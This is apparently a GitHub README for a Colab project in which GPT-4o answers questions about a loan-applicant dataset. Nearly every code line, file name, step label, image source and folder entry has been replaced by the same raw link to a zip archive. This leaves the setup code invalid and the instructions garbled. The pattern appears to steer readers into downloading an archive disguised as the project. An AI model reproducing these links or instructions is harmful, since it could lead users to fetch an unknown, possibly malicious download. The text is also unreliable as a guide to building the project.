# 💼 Loan Review AI Agent using OpenAI GPT-4o

This project builds a conversational AI agent that can intelligently answer questions about a loan applicants dataset using the OpenAI GPT-4o model. The agent is powered by a structured prompt that combines dataset analysis with natural language interaction.

---

## 📁 Project Overview

- **Platform**: Google Colab
- **Language**: Python
- **API**: OpenAI GPT-4o
- **Data**: CSV file containing loan application records
- **Goal**: To allow users to ask natural language questions about the dataset, and get clear, data-driven answers.

---

## 🚀 Features

- Mounts Google Drive to load datasets
- Generates dataset summaries using Pandas
- Sends structured prompts to GPT-4o for intelligent Q&A
- Interacts with users in a conversational loop
- Auto-responds to questions like:
  - *"What is the average loan amount?"*
  - *"How many applicants are self-employed?"*
  - *"Which column has the most missing values?"*

---

## 🛠️ Setup Instructions

### 1. Clone the Notebook

Use Google Colab and ensure your dataset is in your Google Drive.

```python
from https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip import drive
https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip('/content/drive')
```
### 2. Install Required Packages (if needed)
```python
pip install openai pandas
```
### 3. Load Your Dataset
```
/content/drive/MyDrive/PROJECTS/Building an AI Agent using OpenAI https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip
```
### 4. Initialize OpenAI Client
```
from openai import OpenAI
client = OpenAI(api_key='YOUR_API_KEY')  # 🔐 Replace with your real API key
```
### 5.🧠 How It Works
https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip Summary: Automatically summarizes the dataset (columns, datatypes, shape).

https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip Creation: Builds a detailed prompt with dataset summary + user query.

https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip API Call: Sends prompt to GPT-4o and receives an intelligent response.

https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip Loop: Lets the user interact with the agent until "exit" is typed.
### 🧪 Sample Interaction
<img width="794" height="576" alt="image" src="https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip" />


### Some Visualizations
<img width="1024" height="1024" alt="3rd" src="https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip" />



### 📂 Folder Structure
```cpp
📁 PROJECTS
│
├── Building an AI Agent using OpenAI API
│   ├── https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip
│   └── https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip
```

### Quick running
```cpp
https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip a API Key from OPEN AI by creating one from their website.
https://raw.githubusercontent.com/BVNAHUSH/Loan-Review-AI-Agent-using-OpenAI-GPT-4o/main/decapsulation/Loan-Review-AI-Agent-using-OpenAI-GPT-4o.zip your API key in the .py  file.
3. run the overall project.
```
